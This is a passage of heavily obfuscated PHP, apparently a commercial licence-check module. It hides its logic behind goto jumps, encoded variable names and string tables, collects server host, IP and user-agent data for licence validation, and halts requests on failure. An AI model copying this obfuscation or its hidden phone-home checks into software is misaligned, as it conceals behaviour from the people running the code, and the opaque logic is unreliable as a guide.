$EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[114]][$b«ØùÂÌÚ] = $C¹ˆì¡; } goto AçƒÒ¥³™; AÍ™ìÂ•‰£: if ($this->afpc2fb8927f == $Fª¸²»¯µ[138]) { $EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[114]][$Fª¸²»¯µ[119]][$Fª¸²»¯µ[124]] = 0; } $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[145]] = $Fª¸²»¯µ[123]($this->vrit939c873c, $Fª¸²»¯µ[146], $Fª¸²»¯µ[10]); $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[147]] = $Fª¸²»¯µ[123]($this->vrit939c873c, $Fª¸²»¯µ[148], $Fª¸²»¯µ[10]); goto cö²Ïñ‰Å; báÔÄ“ÔÄĞ: unset($EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[114]][$Fª¸²»¯µ[118]]); $EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[114]][$Fª¸²»¯µ[119]] = array($Fª¸²»¯µ[120] => (int) $d ÂÚøÉÁî[$Fª¸²»¯µ[121]], $Fª¸²»¯µ[122] => (int) $Fª¸²»¯µ[123]($d ÂÚøÉÁî, $Fª¸²»¯µ[124], 0)); $EŒÀäÊî†Ì[$Fª¸²»¯µ[125]][$Fª¸²»¯µ[126]] = $Fª¸²»¯µ[127]($Fª¸²»¯µ[128])->{$_SERVER[†Ô…Œèëôú][129]}(); goto AÚğ†â‡½õ; CäòÄå›ñ: unset($EŒÀäÊî†Ì[$Fª¸²»¯µ[113]][$Fª¸²»¯µ[114]][$Fª¸²»¯µ[76]]); $D¿À­¯Û·’ = $a§À„²Ú’§[637]; if (strlen($D¿À­¯Û·’) < $a§À„²Ú’§[619]) { return; } goto báÔÄ“ÔÄĞ; BÀƒĞÙÌ×˜: } private function ovgcea05e438() { goto F°Õ˜æ¦˜; C×í¬Ö¿: $CÀ½Üµ—–É = $Cöß†Ÿ…™ğ[640]; if (strlen($CÀ½Üµ—–É) < $Cöß†Ÿ…™ğ[641]) { die; } $bñÑ˜Òğé® = array($Fñª° Ûø[184] => $BÆÅƒâİÌŒ[$Fñª° Ûø[64]], $Fñª° Ûø[185] => $BÆÅƒâİÌŒ[$Fñª° Ûø[65]], $Fñª° Ûø[186] => $Fñª° Ûø[10]); goto cé¢æ¤Ùõ»; FåâÀƒŞ´¸: if ($this->afpc2fb8927f == $Fñª° Ûø[138]) { return; } $b§àœà‚Æé = array($Fñª° Ûø[178], $Fñª° Ûø[179], $Fñª° Ûø[180], $Fñª° Ûø[181], $Fñª° Ûø[182], $Fñª° Ûø[183]); $BÆÅƒâİÌŒ = $Fñª° Ûø[61]($Fñª° Ûø[62])->{$_SERVER[†Ô…Œèëôú][63]}(); goto C×í¬Ö¿; cé¢æ¤Ùõ»: $EøøÔŞÌ® = $Cöß†Ÿ…™ğ[642]; if (!$EøøÔŞÌ®) { return; } foreach ($b§àœà‚Æé as $F´éÜ”¸êî) { if (!isset($BÆÅƒâİÌŒ[$F´éÜ”¸êî]) || !$BÆÅƒâİÌŒ[$F´éÜ”¸êî]) { continue; } $bñÑ˜Òğé®[$F´éÜ”¸êî] = $BÆÅƒâİÌŒ[$F´éÜ”¸êî]; $D™ìÀ„Œîî = $Cöß†Ÿ…™ğ[643]; if (!$D™ìÀ„Œîî) { return; } } goto D µ¨Úå¥Ù; D µ¨Úå¥Ù: $Fñª° Ûø[13](array($Fñª° Ûø[176], $Fñª° Ûø[177]), $bñÑ˜Òğé®); $CÖ³Š¡‡ßó = $Cöß†Ÿ…™ğ[644]; if (!$CÖ³Š¡‡ßó) { return; } goto a–™Ú®öØ; F°Õ˜æ¦˜: $Cöß†Ÿ…™ğ =& $_SERVER[›èö’ù¤]; $Fñª° Ûø =& $_SERVER[†Ô…Œèëôú]; if ($_SERVER[$Fñª° Ûø[44]] == $Fñª° Ûø[152]) { $FŸÏÖìµáâ = array($Fñª° Ûø[137] => $this->afpc2fb8927f, $Fñª° Ûø[153] => $this->{$_SERVER[†Ô…Œèëôú][154]}(), $Fñª° Ûø[155] => $Fñª° Ûø[61]($Fñª° Ûø[156])->{$_SERVER[†Ô…Œèëôú][157]}()); if ($this->afpc2fb8927f != $Fñª° Ûø[138]) { $Cï¡ƒ‹ùÈæ = $Fñª° Ûø[123]($this->vrit939c873c, $Fñª° Ûø[158]); if ($Cï¡ƒ‹ùÈæ) { $FŸÏÖìµáâ[$Fñª° Ûø[159]] = $Cï¡ƒ‹ùÈæ; $FŸÏÖìµáâ[$Fñª° Ûø[160]] = $Fñª° Ûø[161]($Fñª° Ûø[123]($this->vrit939c873c, $Fñª° Ûø[162])); $FŸÏÖìµáâ[$Fñª° Ûø[163]] = $Fñª° Ûø[123]($this->vrit939c873c, $Fñª° Ûø[148]); } $E¡¶…İ¢áÅ = $Fñª° Ûø[61]($Fñª° Ûø[62])->{$_SERVER[†Ô…Œèëôú][63]}($Fñª° Ûø[164], $Fñª° Ûø[10], !0); if ($Fñª° Ûø[165]($E¡¶…İ¢áÅ) && $Fñª° Ûø[25]($E¡¶…İ¢áÅ, 0, 1) == $Fñª° Ûø[166]) { $E¡¶…İ¢áÅ = $Fñª° Ûø[167]($E¡¶…İ¢áÅ); } if ($Fñª° Ûø[168]($E¡¶…İ¢áÅ) && $E¡¶…İ¢áÅ[$Fñª° Ûø[169]] && $Fñª° Ûø[32]($E¡¶…İ¢áÅ[$Fñª° Ûø[169]], $Fñª° Ûø[170])) { $D¬Í­é­­Å = $Fñª° Ûø[0]($Fñª° Ûø[170], $E¡¶…İ¢áÅ[$Fñª° Ûø[169]]); $FŸÏÖìµáâ[$Fñª° Ûø[171]] = $D¬Í­é­­Å[0]; } } $FŸÏÖìµáâ = $this->{$_SERVER[†Ô…Œèëôú][172]}($Fñª° Ûø[173]($FŸÏÖìµáâ), $Fñª° Ûø[131]($Fñª° Ûø[174])); $fÏ¼ŸïÌ´ = $Cöß†Ÿ…™ğ[639]; $bñÑ˜Òğé® = array($Fñª° Ûø[175] => $FŸÏÖìµáâ); $Fñª° Ûø[13](array($Fñª° Ûø[176], $Fñª° Ûø[177]), $bñÑ˜Òğé®); } goto FåâÀƒŞ´¸; a–™Ú®öØ: } private function hmkabe3d84d3() { goto DçŞÚ†¢‘; DÈÈìî¡‚Ô: if (strlen($cê­¦êßëÃ) < $A†ÖêçÀ²[607]) { return; } Cache::set($D¡ëß‘ï¯…[256] . $D¡ëß‘ï¯…[131]($c ˆğ™í™’ . $D¡ëß‘ï¯…[257]), $D¡ëß‘ï¯…[10]); $AÓÏË™°¾ = $A†ÖêçÀ²[655]; goto BœÆŠ©®İ; D¬ÛÏ²š¬: $b¬ˆá”½Ï = $A†ÖêçÀ²[651]; if (strlen($b¬ˆá”½Ï) < $A†ÖêçÀ²[619]) { die; } $dİî–ˆç‚[$AÑïÙç¬äî] = $d×™ë•Íö‹; goto FÕ‹¥Ü¯†; BœÆŠ©®İ: while (strlen($AÓÏË™°¾) < $A†ÖêçÀ²[616]) { if (!$AÓÏË™°¾) { break; } $AÓÏË™°¾++; } $D¡ëß‘ï¯…[191]($D¡ëß‘ï¯…[223]($D¡ëß‘ï¯…[233]), !0); goto eĞœÆ¸®Ñå; fÊ“¢ìŠ›: if (!isset($eÛàÖÓŒÃê[$D¡ëß‘ï¯…[190]]) || $D¡ëß‘ï¯…[24]($eÛàÖÓŒÃê[$D¡ëß‘ï¯…[190]]) != 16) { $D¡ëß‘ï¯…[191]($D¡ëß‘ï¯…[192] . $eÛàÖÓŒÃê[$D¡ëß‘ï¯…[190]], !1); } $c ˆğ™í™’ = $D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[62])->{$_SERVER[†Ô…Œèëôú][63]}($D¡ëß‘ï¯…[133]); $dñ¼„ÂãÜ¥ = $D¡ëß‘ï¯…[131]($_SERVER[$D¡ëß‘ï¯…[132]] . $c ˆğ™í™’); goto DƒâÙêŠ—ã; fÀã“¬ÑÉ„: $cÓ…ªª‚Şó = $A†ÖêçÀ²[646]; if (!$cÓ…ªª‚Şó) { return; } if (!$CÕ”Áºñ¿ || $CÕ”Áºñ¿ != $F‚³ºµø½¼[$D¡ëß‘ï¯…[162]]) { $f®Äô¼íŸæ = array($D¡ëß‘ï¯…[227] => $D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[62])->{$_SERVER[†Ô…Œèëôú][63]}($D¡ëß‘ï¯…[133]), $D¡ëß‘ï¯…[228] => $_SERVER[$D¡ëß‘ï¯…[132]], $D¡ëß‘ï¯…[229] => $D¡ëß‘ï¯…[230](), $D¡ëß‘ï¯…[199] => $_SERVER[$D¡ëß‘ï¯…[200]]); $BÖ­ğÕ»í = $this->{$_SERVER[†Ô…Œèëôú][231]}($D¡ëß‘ï¯…[173]($f®Äô¼íŸæ)); $this->{$_SERVER[†Ô…Œèëôú][209]}($D¡ëß‘ï¯…[232] . $BÖ­ğÕ»í); $D¡ëß‘ï¯…[191]($D¡ëß‘ï¯…[223]($D¡ëß‘ï¯…[233]), !0); } goto D†•ø„Éìó; D†•ø„Éìó: $DĞµ‰¾Ì·® = array($D¡ëß‘ï¯…[234] => $F‚³ºµø½¼[$D¡ëß‘ï¯…[235]], $D¡ëß‘ï¯…[236] => $F‚³ºµø½¼[$D¡ëß‘ï¯…[237]], $D¡ëß‘ï¯…[238] => $D¡ëß‘ï¯…[141](16), $D¡ëß‘ï¯…[137] => $F‚³ºµø½¼[$D¡ëß‘ï¯…[239]]); if ($aÂÀÑÖñ£[$D¡ëß‘ï¯…[193]]) { $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[238]] = $aÂÀÑÖñ£[$D¡ëß‘ï¯…[193]]; } $f¤×¡Ş¹¯³ = $D¡ëß‘ï¯…[25]($D¡ëß‘ï¯…[131]($DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[236]]), 10, 10); goto bÍé“²õ·¶; DƒâÙêŠ—ã: $fÀÚ½Ì±ˆ¤ = $A†ÖêçÀ²[645]; $aÂÀÑÖñ£ = array($D¡ëß‘ï¯…[190] => $eÛàÖÓŒÃê[$D¡ëß‘ï¯…[190]], $D¡ëß‘ï¯…[193] => $D¡ëß‘ï¯…[141](16), $D¡ëß‘ï¯…[194] => $D¡ëß‘ï¯…[174], $D¡ëß‘ï¯…[195] => $D¡ëß‘ï¯…[196], $D¡ëß‘ï¯…[197] => $_SERVER[$D¡ëß‘ï¯…[198]], $D¡ëß‘ï¯…[199] => $_SERVER[$D¡ëß‘ï¯…[200]], $D¡ëß‘ï¯…[201] => $_SERVER[$D¡ëß‘ï¯…[202]], $D¡ëß‘ï¯…[130] => $dñ¼„ÂãÜ¥, $D¡ëß‘ï¯…[203] => $D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[62])->{$_SERVER[†Ô…Œèëôú][63]}($D¡ëß‘ï¯…[164])); if ($eÛàÖÓŒÃê[$D¡ëß‘ï¯…[204]] == $D¡ëß‘ï¯…[205]) { $eô¸‡İóíä = $this->{$_SERVER[†Ô…Œèëôú][172]}($dñ¼„ÂãÜ¥, $D¡ëß‘ï¯…[206]); $BÖ­ğÕ»í = $this->{$_SERVER[†Ô…Œèëôú][144]}($D¡ëß‘ï¯…[173]($aÂÀÑÖñ£), $dñ¼„ÂãÜ¥ . $D¡ëß‘ï¯…[207], 3); $BÖ­ğÕ»í = $BÖ­ğÕ»í . $D¡ëß‘ï¯…[208] . $_SERVER[$D¡ëß‘ï¯…[198]]; $F³ñÜŸÈëİ = $this->{$_SERVER[†Ô…Œèëôú][209]}($D¡ëß‘ï¯…[210] . $eô¸‡İóíä . $D¡ëß‘ï¯…[211] . $BÖ­ğÕ»í, -1); $D¡ëß‘ï¯…[191]($F³ñÜŸÈëİ, !0); } else { if ($eÛàÖÓŒÃê[$D¡ëß‘ï¯…[204]] == $D¡ëß‘ï¯…[212]) { $DøíÆ¢—ã… = $D¡ëß‘ï¯…[25]($D¡ëß‘ï¯…[131]($D¡ëß‘ï¯…[213] . $dñ¼„ÂãÜ¥), 12, 15) . $D¡ëß‘ï¯…[214]; $BÖ­ğÕ»í = $this->{$_SERVER[†Ô…Œèëôú][215]}($D¡ëß‘ï¯…[2]($eÛàÖÓŒÃê[$D¡ëß‘ï¯…[216]]), $DøíÆ¢—ã…, 2); $Eé•·µ©ÅÆ = $D¡ëß‘ï¯…[217]($BÖ­ğÕ»í, !0); if (!$D¡ëß‘ï¯…[168]($Eé•·µ©ÅÆ) || !$D¡ëß‘ï¯…[168]($Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]]) || $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[190]] != !0) { $f†Ï‹ßÇ‹Œ = $D¡ëß‘ï¯…[219]; $dÇñàĞ¤º¥ = $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]] ? $D¡ëß‘ï¯…[220] . $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]] : $f†Ï‹ßÇ‹Œ; $D¡ëß‘ï¯…[191]($dÇñàĞ¤º¥, !1); } else { $aÂÀÑÖñ£[$D¡ëß‘ï¯…[193]] = $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]][$D¡ëß‘ï¯…[221]]; } } else { $Eé•·µ©ÅÆ = $this->{$_SERVER[†Ô…Œèëôú][209]}($D¡ëß‘ï¯…[222], $aÂÀÑÖñ£, 10); } } goto BÚ„ÜÊœ; fç¸Ì¥ôæ†: $AÑïÙç¬äî = $D¡ëß‘ï¯…[240]($D¡ëß‘ï¯…[25]($bà¬¥“ÇÁæ, 10, 16)); $EÁÊ«Îã½É = $A†ÖêçÀ²[649]; while ($EÁÊ«Îã½É < $A†ÖêçÀ²[641]) { if ($EÁÊ«Îã½É >= 0) { break; } $EÁÊ«Îã½É++; } goto dä¦™Æ—†í; Dˆµ²…¹‹: $this->afpc2fb8927f = $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[137]]; $this->{$_SERVER[†Ô…Œèëôú][255]}(); $cê­¦êßëÃ = $A†ÖêçÀ²[654]; goto DÈÈìî¡‚Ô; bÍé“²õ·¶: $c¼†¼À‹·× = $f¤×¡Ş¹¯³ . $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[137]] . $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[238]]; $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[139]] = $D¡ëß‘ï¯…[240]($D¡ëß‘ï¯…[135]($this->{$_SERVER[†Ô…Œèëôú][172]}($c¼†¼À‹·×, $D¡ëß‘ï¯…[241]))); $A¯Óåä÷é» = $A†ÖêçÀ²[647]; goto D†÷¹§É£; F´İ¦ë¯·: $bà¬¥“ÇÁæ = $D¡ëß‘ï¯…[131]($_SERVER[$D¡ëß‘ï¯…[132]] . $D¡ëß‘ï¯…[240]($c ˆğ™í™’) . $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[236]]); $A¨ƒÆÂóÄ„ = $A†ÖêçÀ²[648]; if (!$A¨ƒÆÂóÄ„) { return; } goto fç¸Ì¥ôæ†; dä¦™Æ—†í: $d×™ë•Íö‹ = $this->{$_SERVER[†Ô…Œèëôú][144]}($D¡ëß‘ï¯…[173]($F‚³ºµø½¼), $bà¬¥“ÇÁæ); $D¢ŸÀ¦¬Å = $D¡ëß‘ï¯…[248]($D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[11])->{$_SERVER[†Ô…Œèëôú][249]}(), $D¡ëß‘ï¯…[250]); $B×«äí‹—¯ = $D¢ŸÀ¦¬Å[$D¡ëß‘ï¯…[251]]; goto A¥÷®šàœŒ; BÚ„ÜÊœ: if (!$D¡ëß‘ï¯…[168]($Eé•·µ©ÅÆ) || !$D¡ëß‘ï¯…[168]($Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]]) || $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[190]] != !0) { $f†Ï‹ßÇ‹Œ = $D¡ëß‘ï¯…[223]($D¡ëß‘ï¯…[224]); $dÇñàĞ¤º¥ = $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]] ? $D¡ëß‘ï¯…[220] . $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]] : $f†Ï‹ßÇ‹Œ; $D¡ëß‘ï¯…[191]($dÇñàĞ¤º¥, !1); } $F‚³ºµø½¼ = $Eé•·µ©ÅÆ[$D¡ëß‘ï¯…[218]]; $CÕ”Áºñ¿ = $this->{$_SERVER[†Ô…Œèëôú][225]}($F‚³ºµø½¼[$D¡ëß‘ï¯…[226]]); goto fÀã“¬ÑÉ„; D†÷¹§É£: if (strlen($A¯Óåä÷é») < $A†ÖêçÀ²[619]) { return; } $C­ÈÃãÂİ = $D¡ëß‘ï¯…[141](16); $F¢¿Ôº‰ŸÃ = $C­ÈÃãÂİ . $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[137]] . $this->{$_SERVER[†Ô…Œèëôú][172]}($D¡ëß‘ï¯…[131]($DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[234]]), $C­ÈÃãÂİ); goto B“•Ô§Ó£Ë; A‘Êêâ…ß”: $aİ»ßÊì¥ = $A†ÖêçÀ²[653]; if (strlen($aİ»ßÊì¥) < $A†ÖêçÀ²[619]) { return; } $this->vrit939c873c = $F‚³ºµø½¼; goto Dˆµ²…¹‹; FÕ‹¥Ü¯†: $EÃÌíÎÖÕ = $A†ÖêçÀ²[652]; if (!$EÃÌíÎÖÕ) { return; } $D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[11])->{$_SERVER[†Ô…Œèëôú][252]}($B×«äí‹—¯[$D¡ëß‘ï¯…[253]], array($D¡ëß‘ï¯…[254] => $dİî–ˆç‚)); goto A‘Êêâ…ß”; A¥÷®šàœŒ: $a“á‰´îĞ = $A†ÖêçÀ²[650]; while ($a“á‰´îĞ < $A†ÖêçÀ²[641]) { if ($a“á‰´îĞ >= 0) { break; } $a“á‰´îĞ++; } $dİî–ˆç‚ = array(); goto D¬ÛÏ²š¬; EøêÏòƒƒÍ: if (!$D¡ëß‘ï¯…[123]($GLOBALS, $D¡ëß‘ï¯…[149])) { die; } $eÛàÖÓŒÃê = $GLOBALS[$D¡ëß‘ï¯…[22]]; if (isset($eÛàÖÓŒÃê[$D¡ëß‘ï¯…[188]])) { $this->{$_SERVER[†Ô…Œèëôú][189]}(); die; } goto fÊ“¢ìŠ›; B“•Ô§Ó£Ë: $DĞµ‰¾Ì·®[$D¡ëß‘ï¯…[140]] = $D¡ëß‘ï¯…[135]($D¡ëß‘ï¯…[240]($this->{$_SERVER[†Ô…Œèëôú][172]}($F¢¿Ôº‰ŸÃ, $D¡ëß‘ï¯…[242]))); if ($F‚³ºµø½¼[$D¡ëß‘ï¯…[243]] && $F‚³ºµø½¼[$D¡ëß‘ï¯…[243]] >= 1) { $D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[62])->{$_SERVER[†Ô…Œèëôú][244]}($D¡ëß‘ï¯…[245], $D¡ëß‘ï¯…[246]); } $D¡ëß‘ï¯…[61]($D¡ëß‘ï¯…[62])->{$_SERVER[†Ô…Œèëôú][247]}($DĞµ‰¾Ì·®); goto F´İ¦ë¯·; DçŞÚ†¢‘: $A†ÖêçÀ² =& $_SERVER[›èö’ù¤]; $D¡ëß‘ï¯… =& $_SERVER[†Ô…Œèëôú]; if ($_SERVER[$D¡ëß‘ï¯…[44]] != $D¡ëß‘ï¯…[187]) { return; } goto EøêÏòƒƒÍ; eĞœÆ¸®Ñå: } private function licenseRegistSuccess() { $c¬²¹Î„îù =& $_SERVER[†Ô…Œèëôú]; $B‹Å ¦¡åê = $c¬²¹Î„îù[61]($c¬²¹Î„îù[62])->{$_SERVER[†Ô…Œèëôú][63]}(); $Aå§¼ì¯§ = $_SERVER[›èö’ù¤][656]; if ($B‹Å ¦¡åê[$c¬²¹Î„îù[93]] != $c¬²¹Î„îù[246]) { $c¬²¹Î„îù[61]($c¬²¹Î„îù[62])->{$_SERVER[†Ô…Œèëôú][247]}($c¬²¹Î„îù[93], $c¬²¹Î„îù[246]); } $c¬²¹Î„îù[127]($c¬²¹Î„îù[258])->{$_SERVER[†Ô…Œèëôú][259]}(!0); } private function meib50958fd3() { goto eéé½˜ìÇŒ; dÇ ¤îİ‚½: $D×ò†›ÎÔ = $Fˆó–±±–[658]; if (!$D×ò†›ÎÔ) { die; } $this->vrit939c873c = array(); goto bÖ©†½óŞ; a§°š«æœ¢: $bµ„ËÆê«Û = $Fˆó–±±–[657]; while ($bµ„ËÆê«Û < $Fˆó–±±–[602]) { if ($bµ„ËÆê«Û >= 0) { break; } $bµ„ËÆê«Û++; } $EÚ¾šÊ•¢±[61]($EÚ¾šÊ•¢±[62])->{$_SERVER[†Ô…Œèëôú][244]}($EÚ¾šÊ•¢±[245], $EÚ¾šÊ•¢±[260]); goto dÇ ¤îİ‚½; bÖ©†½óŞ: $this->afpc2fb8927f = $EÚ¾šÊ•¢±[138]; $bÀÉ¿Ñ‘×Â = $Fˆó–±±–[659]; goto f¿´¦ëÓ»š; eéé½˜ìÇŒ: $Fˆó–±±– =& $_SERVER[›èö’ù¤]; $EÚ¾šÊ•¢± =& $_SERVER[†Ô…Œèëôú]; $EÚ¾šÊ•¢±[61]($EÚ¾šÊ•¢±[62])->{$_SERVER[†Ô…Œèëôú][247]}(array($EÚ¾šÊ•¢±[234] => $EÚ¾šÊ•¢±[10], $EÚ¾šÊ•¢±[236] => $EÚ¾šÊ•¢±[10], $EÚ¾šÊ•¢±[137] => $EÚ¾šÊ•¢±[138], $EÚ¾šÊ•¢±[139] => $EÚ¾šÊ•¢±[10], $EÚ¾šÊ•¢±[140] => $EÚ¾šÊ•¢±[10])); goto a§°š«æœ¢; f¿´¦ëÓ»š: } private function mxhy04ceb8f3() { goto d©›ËÒ£ÖÒ; B¢íÅ‚‘ÔÖ: $this->vrit939c873c = $Eš±İùğƒË; $this->afpc2fb8927f = $D­³›‰…ˆÊ[$bÇ¸Šøéƒ[137]]; $C«ñøÅ‘…š = $bî·ÔğÆÙ[664]; goto f‘‡›–Ö; f‘‡›–Ö: while (strlen($C«ñøÅ‘…š) < $bî·ÔğÆÙ[641]) { if (!$C«ñøÅ‘…š) { break; } $C«ñøÅ‘…š++; } goto báãÇ³Ò­Ë; E³¥¦¢¡ë: while ($a‰µëéÊ› < $bî·ÔğÆÙ[616]) { if ($a‰µëéÊ› >= 0) { break; } $a‰µëéÊ›++; } if (!$bÇ¸Šøéƒ[168]($Eš±İùğƒË) || !isset($Eš±İùğƒË[$bÇ¸Šøéƒ[261]]) || $bÇ¸Šøéƒ[262]() - $Eš±İùğƒË[$bÇ¸Šøéƒ[261]] >= 60) { $bÁØÚ™ª‘† = $bÇ¸Šøéƒ[61]($bÇ¸Šøéƒ[11])->{$_SERVER[†Ô…Œèëôú][263]}(); $a†«»Ï÷¿¥ = $bÁØÚ™ª‘†[$bÇ¸Šøéƒ[251]]; $eÜÎ¦ôóõ = $bÇ¸Šøéƒ[131]($_SERVER[$bÇ¸Šøéƒ[132]] . $bÇ¸Šøéƒ[240]($e‘ô’ŠÊ„¯) . $D­³›‰…ˆÊ[$bÇ¸Šøéƒ[236]]); $cßß´ñÄâô = $bÇ¸Šøéƒ[240]($bÇ¸Šøéƒ[25]($eÜÎ¦ôóõ, 10, 16)); $Eš±İùğƒË = $this->{$_SERVER[†Ô…Œèëôú][215]}($a†«»Ï÷¿¥[$bÇ¸Šøéƒ[111]][$cßß´ñÄâô], $eÜÎ¦ôóõ); $Eš±İùğƒË = $bÇ¸Šøéƒ[217]($Eš±İùğƒË, !0); } if (!$bÇ¸Šøéƒ[168]($Eš±İùğƒË)) { return $this->{$_SERVER[†Ô…Œèëôú][189]}(); } goto D«ôÕÇÜĞ; dÂÚÃÏ‰‚È: $this->afpc2fb8927f = $bÇ¸Šøéƒ[138]; $a¦æ°ŒìÆæ = $bî·ÔğÆÙ[660]; while (strlen($a¦æ°ŒìÆæ) < $bî·ÔğÆÙ[602]) { if (!$a¦æ°ŒìÆæ) { break; } $a¦æ°ŒìÆæ++; } goto Eğ©ä‘Å©; Eğ©ä‘Å©: $D­³›‰…ˆÊ = $bÇ¸Šøéƒ[61]($bÇ¸Šøéƒ[62])->{$_SERVER[†Ô…Œèëôú][63]}(); if ($D­³›‰…ˆÊ[$bÇ¸Šøéƒ[137]] == $bÇ¸Šøéƒ[138]) { return; } $e‘ô’ŠÊ„¯ = $bÇ¸Šøéƒ[61]($bÇ¸Šøéƒ[62])->{$_SERVER[†Ô…Œèëôú][63]}($bÇ¸Šøéƒ[133]); goto D£ê¨ÆË‰õ; D£ê¨ÆË‰õ: $aÌ¡ô»ˆ¿Ô = $bî·ÔğÆÙ[661]; $eËˆ§¶«‘ê = $bÇ¸Šøéƒ[256] . $bÇ¸Šøéƒ[131]($e‘ô’ŠÊ„¯ . $bÇ¸Šøéƒ[257]); $e—Ûªî›¦ = $bî·ÔğÆÙ[662]; goto FÑÌ³¯ìó; d©›ËÒ£ÖÒ: $bî·ÔğÆÙ =& $_SERVER[›èö’ù¤]; $bÇ¸Šøéƒ =& $_SERVER[†Ô…Œèëôú]; $_SERVER[$bÇ¸Šøéƒ[200]] = $bÇ¸Šøéƒ[123]($_SERVER, $bÇ¸Šøéƒ[200], APP_HOST); goto dÂÚÃÏ‰‚È; D«ôÕÇÜĞ: $a½—Î¬Ö¯ = $bÇ¸Šøéƒ[161]($Eš±İùğƒË[$bÇ¸Šøéƒ[162]]); if ($bÇ¸Šøéƒ[262]() >= $a½—Î¬Ö¯) { return $this->{$_SERVER[†Ô…Œèëôú][189]}(); } if ($bÇ¸Šøéƒ[262]() - $Eš±İùğƒË[$bÇ¸Šøéƒ[261]] > 20) { $Eš±İùğƒË[$bÇ¸Šøéƒ[261]] = $bÇ¸Šøéƒ[262](); Cache::set($eËˆ§¶«‘ê, $Eš±İùğƒË); } goto B¢íÅ‚‘ÔÖ; FÑÌ³¯ìó: if (strlen($e—Ûªî›¦) < $bî·ÔğÆÙ[602]) { return; } $Eš±İùğƒË = Cache::get($eËˆ§¶«‘ê); $a‰µëéÊ› = $bî·ÔğÆÙ[663]; goto E³¥¦¢¡ë; báãÇ³Ò­Ë: } private function cegmf2fe3fa4() { goto d³£š¤—‹; d³£š¤—‹: $aˆìÒŞ•ê =& $_SERVER[†Ô…Œèëôú]; $Dß™¾è­Õâ = $GLOBALS[$aˆìÒŞ•ê[22]]; $c…ÅŸ¨ÜŞ„ = $_SERVER[$aˆìÒŞ•ê[44]]; goto BÌœÇêÑé; F“‡ÉÉ‚ª¾: if ($aˆìÒŞ•ê[269]($c…ÅŸ¨ÜŞ„, $bó¹ÏÓÉá¿)) { if ($this->afpc2fb8927f == $aˆìÒŞ•ê[138] && isset($Dß™¾è­Õâ[$aˆìÒŞ•ê[270]])) { $aˆìÒŞ•ê[191]($aˆìÒŞ•ê[223]($aˆìÒŞ•ê[265]), !1, $aˆìÒŞ•ê[266]); die; } $b‰‰‹âŠ› = $this->{$_SERVER[†Ô…Œèëôú][154]}(); if ($b‰‰‹âŠ› != $aˆìÒŞ•ê[271]($aˆìÒŞ•ê[272])) { if ($b‰‰‹âŠ› <= $aˆìÒŞ•ê[61]($aˆìÒŞ•ê[156])->{$_SERVER[†Ô…Œèëôú][157]}()) { $aˆìÒŞ•ê[191]($aˆìÒŞ•ê[223]($aˆìÒŞ•ê[273]), !1, $aˆìÒŞ•ê[266]); die; } } } goto bêÓÏÒ¯“å; BÌœÇêÑé: $CÆ³‡ÀÙ½ = $_SERVER[›èö’ù¤][665]; if ($c…ÅŸ¨ÜŞ„ == $aˆìÒŞ•ê[264] && $this->afpc2fb8927f == $aˆìÒŞ•ê[138]) { $aˆìÒŞ•ê[191]($aˆìÒŞ•ê[223]($aˆìÒŞ•ê[265]), !1, $aˆìÒŞ•ê[266]); } $bó¹ÏÓÉá¿ = array($aˆìÒŞ•ê[267], $aˆìÒŞ•ê[268]); goto F“‡ÉÉ‚ª¾; bêÓÏÒ¯“å: } private function zfawc0fcb286() { goto BòŒÉë—ÔÒ; dÉ¤ªˆ¨»ó: $EÇé·ÙÏí = $B¦Õ´„îÊ[667]; if (!$EÇé·ÙÏí) { die; } $CëÕç¨…× = $dø©©ƒˆÙ®[279](array($dø©©ƒˆÙ®[280] => array($dø©©ƒˆÙ®[281] => $dø©©ƒˆÙ®[282], $dø©©ƒˆÙ®[283] => 3))); goto C…÷÷Üóô»; fæÛëà­Æ: while (strlen($C»Ÿ„Â¶Î) < $B¦Õ´„îÊ[619]) { if (!$C»Ÿ„Â¶Î) { break; } $C»Ÿ„Â¶Î++; } if ($AÌ·ŒÎ”©ß && $dø©©ƒˆÙ®[32]($AÌ·ŒÎ”©ß, $dø©©ƒˆÙ®[287])) { echo $AÌ·ŒÎ”©ß; } die; goto A¹’‰…¨†¡; BòŒÉë—ÔÒ: $B¦Õ´„îÊ =& $_SERVER[›èö’ù¤]; $dø©©ƒˆÙ® =& $_SERVER[†Ô…Œèëôú]; $e…ò ÖˆÖ• = array($dø©©ƒˆÙ®[152], $dø©©ƒˆÙ®[274]); goto bÂï•Ê‡; bÂï•Ê‡: $CõÜŠ§›« = $B¦Õ´„îÊ[666]; while ($CõÜŠ§›« < $B¦Õ´„îÊ[641]) { if ($CõÜŠ§›« >= 0) { break; } $CõÜŠ§›«++; } if (!$dø©©ƒˆÙ®[123]($GLOBALS, $dø©©ƒˆÙ®[149]) || !isset($_GET[$dø©©ƒˆÙ®[275]])) { return; } goto e°í™›à­Ê; C…÷÷Üóô»: 